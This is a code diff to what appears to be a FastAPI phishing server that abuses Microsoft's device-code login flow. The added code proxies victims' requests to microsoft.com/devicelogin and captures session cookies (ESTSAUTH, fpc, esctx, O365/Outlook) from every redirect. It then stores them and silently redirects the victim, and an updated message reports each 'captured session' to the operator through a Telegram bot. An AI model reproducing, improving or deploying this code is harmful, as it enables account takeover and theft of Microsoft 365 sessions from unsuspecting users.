@@ -55,7 +55,7 @@ async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
         return
     try:
-        msg = f"New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (O365/Outlook included)"
+        msg = f"✅ New Microsoft Session Captured!\n\nDevice: {device_code[:12]}...\nUser Code: {user_code}\nCookies Captured: {count} (ESTSAUTH, fpc, esctx, O365/Outlook included)"
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
@@ -135,9 +135,9 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# NEW PROXY PATTERN - Simple redirect to original Microsoft page + cookie capture
-@app.get("/proxy/device-login/{device_code}")
-async def proxy(device_code: str):
+# ADVANCED PROXY - Silent redirect to original Microsoft page + full cookie capture
+@app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
+async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
         raise HTTPException(403, "Proxy disabled")
 
@@ -145,26 +145,42 @@ async def proxy(device_code: str):
     if not session or "user_code" not in session:
         raise HTTPException(404, "Session expired or invalid")
 
-    # Original Microsoft device login URL with user_code
+    cookie_jar = httpx.Cookies()
+    for n, c in session.get("cookies", {}).items():
+        cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
+
+    # Original Microsoft device login page
+    target_url = "https://microsoft.com/devicelogin"
+
+    async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
+        resp = await c.request(
+            method=request.method,
+            url=target_url,
+            params={"input": session["user_code"]},
+            headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
+            content=await request.body() if request.method != "GET" else None
+        )
+
+    # Capture all cookies from every redirect (highly advanced)
+    captured = {}
+    for past in list(resp.history) + [resp]:
+        for h in past.headers.getlist("set-cookie"):
+            cookie = SimpleCookie()
+            cookie.load(h)
+            for m in cookie.values():
+                captured[m.key] = {"value": m.value, "domain": ".microsoftonline.com", "path": "/"}
+
+    if "cookies" not in session:
+        session["cookies"] = {}
+    session["cookies"].update(captured)
+    await save_session(device_code, session)
+
+    # Silent redirect to original Microsoft page
     microsoft_url = f"https://microsoft.com/devicelogin?input={session['user_code']}"
-
-    # Return a simple HTML page that immediately redirects to Microsoft
-    # This allows the proxy to stay in the session for cookie capture
     html = f"""
-    <html>
-    <head>
-        <title>Redirecting to Microsoft...</title>
-        <meta http-equiv="refresh" content="0;url={microsoft_url}">
-    </head>
-    <body>
-        <p>Redirecting to Microsoft device login...</p>
-        <script>
-            window.location = "{microsoft_url}";
-        </script>
-    </body>
-    </html>
+    <html><head><meta http-equiv="refresh" content="0;url={microsoft_url}"></head>
+    <body></body></html>
     """
-
     return Response(content=html, media_type="text/html")
 
 
